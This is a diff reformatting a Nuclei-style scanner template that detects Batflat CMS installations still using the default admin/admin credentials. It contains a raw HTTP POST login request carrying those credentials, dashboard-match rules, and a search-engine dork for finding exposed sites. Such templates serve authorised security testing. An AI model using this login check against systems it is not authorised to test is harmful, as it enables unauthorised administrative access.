@@ -1,45 +1,42 @@
 id: batflat-default-login
-
 info:
-  name: Batflat CMS Default Credentials
+  name: Batflat CMS - Default Login
   author: r3Y3r53
   severity: high
-  description: Batflat CMS default login credentials were discovered.
+  description: |
+    Batflat CMS is vulnerable to default login vulnerability that most commonly affects devices having some pre-set (default) administrative credentials to access all configuration settings.
   reference:
-    - https://www.exploitalert.com/view-details.html?id=34749
     - https://cxsecurity.com/issue/WLB-2020010100
+    - https://www.exploitalert.com/view-details.html?id=34749
   classification:
     cpe: cpe:2.3:a:batflat:batflat:*:*:*:*:*:*:*:*
   metadata:
     runzero-match: service["http.body"] contains "Powered by Batflat"
-    verified: true
-    max-request: 1
-    vendor: batflat
-    product: batflat
     google-query: intext:"Powered by Batflat."
-  tags: default-login,batflat,vuln
-
+    max-request: 1
+    product: batflat
+    vendor: batflat
+    verified: true
+  tags: batflat,default-login,vuln
 http:
-  - raw:
+  - attack: pitchfork
+    host-redirects: true
+    matchers:
+      - condition: and
+        dsl:
+          - status_code == 200
+          - contains(content_type, "text/html")
+          - contains(body, "Batflat - Dashboard")
+        type: dsl
+    payloads:
+      password:
+        - admin
+      username:
+        - admin
+    raw:
       - |
         POST /admin/ HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
 
         username={{username}}&password={{password}}&login=
-
-    attack: pitchfork
-    payloads:
-      username:
-        - admin
-      password:
-        - admin
-    host-redirects: true
-    matchers:
-      - type: dsl
-        dsl:
-          - status_code == 200
-          - contains(content_type, "text/html")
-          - contains(body, "Batflat - Dashboard")
-        condition: and
-
